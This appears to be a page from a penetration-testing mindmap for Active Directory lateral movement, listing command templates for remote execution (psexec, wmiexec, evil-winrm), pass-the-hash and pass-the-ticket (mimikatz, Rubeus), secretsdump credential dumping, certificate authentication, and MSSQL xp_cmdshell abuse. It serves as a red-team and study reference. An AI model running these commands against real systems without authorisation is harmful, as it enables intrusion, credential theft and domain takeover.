---
title: "Lateral Movement"
category: lateral-movement
color: "#868e96"
tags:
  - ad-mindmap
  - lateral-movement
---

# ↔️ Lateral Movement

> [!info] Mindmap box `Lateral Move`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Clear text Password
➡️ [[Admin Access|Admin]]

- Interactive-shell - psexec ➡️ [[Admin Access|Authority/System]]
    - `psexec.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
    - `psexec.exe -AcceptEULA \\<ip>` [↗](https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec)
    - `psexecsvc.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/sensepost/susinternals)
- Pseudo-shell (file write and read)
    - `atexec.py  <domain>/<user>:<password>@<ip> "command"` [↗](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
    - `smbexec.py  <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
    - `wmiexec.py  <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
    - `dcomexec.py  <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
    - `nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>` [↗](https://github.com/Pennyw0rth/NetExec)
- WinRM ➡️ [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]
    - `evil-winrm -i <ip> -u <user> -p <password>` [↗](https://github.com/Hackplayers/evil-winrm)
    - `Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>` [↗](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession)
    - `nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>` [↗](https://github.com/Pennyw0rth/NetExec)
- RDP ➡️ [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]
    - `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>` [↗](https://linux.die.net/man/1/xfreerdp)
- SMB ➡️ **Search files**
    - `smbclient.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py)
    - `smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>` [↗](https://github.com/p0dalirius/smbclient-ng)
- MSSQL ➡️ [[Lateral Movement|MSSQL]]
    - `nxc mssql <ip_range> -u <user> -p <password>` [↗](https://github.com/Pennyw0rth/NetExec)
    - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)

## NT Hash

- Pass the Hash
    - MSSQL/PseudoShell PsExec/SMB... ➡️ [[Admin Access|Admin]]
        - `impacket : same as with creds, but use -hashes ':<hash>'` [↗](https://github.com/fortra/impacket)
        - `nxc : same as with creds, but use -H ':<hash>'` [↗](https://github.com/Pennyw0rth/NetExec)
    - `mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"` [↗](https://github.com/gentilkiwi/mimikatz) ➡️ [[Admin Access|Admin]]
    - RDP ➡️ [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]
        - `reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'` [↗](https://github.com/fortra/impacket/blob/master/examples/reg.py)
            - `xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>` [↗](https://linux.die.net/man/1/xfreerdp)
    - WinRM ➡️ [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]
        - `evil-winrm -i <ip> -u <user> -H <hash>` [↗](https://github.com/Hackplayers/evil-winrm)
- Overpass the Hash / Pass the key (PTK) ➡️ [[Admin Access|Admin]]
    - `Rubeus.exe asktgt /user:victim /rc4:<rc4value>` [↗](https://github.com/GhostPack/Rubeus)
        - `Rubeus.exe ptt /ticket:<ticket>` [↗](https://github.com/GhostPack/Rubeus)
        - `Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]` [↗](https://github.com/GhostPack/Rubeus)
    - `getTGT.py <domain>/<user> -hashes :<hashes>` [↗](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)

## Kerberos

- Pass the Ticket (ccache / kirbi)
    - Convert Format
        - `ticketConverter.py <kirbi||ccache> <ccache||kirbi>` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)
    - `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache` ➡️ [[Admin Access|Admin]]
        - `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket` [↗](https://github.com/fortra/impacket)
    - `mimikatz kerberos::ptc "<ticket>"` [↗](https://github.com/gentilkiwi/mimikatz)
    - `Rubeus.exe ptt /ticket:<ticket>` [↗](https://github.com/GhostPack/Rubeus)
    - `proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    - Modify SPN ➡️ [[Lateral Movement|PassTheTicket]]
        - `tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256` [↗](https://github.com/fortra/impacket/pull/1256)
- Aeskey ➡️ [[Admin Access|Admin]]
    - `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)` [↗](https://github.com/fortra/impacket)
    - `proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## Socks (relay)

- `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids` [↗](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
- `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) ➡️ [[Lateral Movement|MSSQL]]
- `proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) ➡️ [[ACLs & ACEs Permissions|DCSYNC]]
- `proxychains smbclient.py -no-pass <user>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) ➡️ **Search files**
- `proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"` [↗](https://github.com/fortra/impacket/blob/master/examples/atexec.py) ➡️ [[Admin Access|Authority/System]]
- `proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) ➡️ [[Admin Access|Authority/System]]

## Certificate (pfx)

- unpac the hash
    - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)
    - `gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>` [↗](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
        - `getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'` [↗](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)
- Pass the certificate
    - pkinit
        - `gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"` [↗](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
        - `Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show` [↗](https://github.com/GhostPack/Rubeus)
        - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)
    - schannel
        - `certipy auth -pfx <pfx_file> -ldap-shell` [↗](https://github.com/ly4k/Certipy)
            - add_computer
                - Set RBCD ➡️ [[Kerberos Delegation|RBCD]]
        - `certipy cert -pfx "<pfx_file>" -nokey -out "user.crt"` [↗](https://github.com/ly4k/Certipy)
            - `certipy cert -pfx "<pfx_file>" -nocert -out "user.key"` [↗](https://github.com/ly4k/Certipy)
                - `passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>` [↗](https://github.com/AlmondOffSec/PassTheCert)

## MSSQL

- find mssql access
    - `nxc mssql <ip> -u <user> -p <password> -d <domain>` [↗](https://github.com/Pennyw0rth/NetExec) ➡️ [[Lateral Movement|MSSQL]]
- Users or Computers with SQL admin
- `MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p` [↗](https://github.com/SpecterOps/BloodHound) ➡️ [[Lateral Movement|MSSQL]]
- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
    - `enum_db`
    - `enable_xp_cmdshell`
        - `xp_cmdshell <cmd>` ➡️ [[Low Access (Privilege Escalation)|Low Access]]
    - `enum_impersonate`
        - `exec_as_user <user>` ➡️ [[Lateral Movement|MSSQL]]
        - `exec_as_login <login>` ➡️ [[Lateral Movement|MSSQL]]
    - `xp_dir_tree <ip>` ➡️ [[Man In The Middle|COERCE SMB]]
    - `trustlink`
        - `sp_linkedservers`
            - `use_link` ➡️ [[Lateral Movement|MSSQL]] / [[Trusts|Trust]]
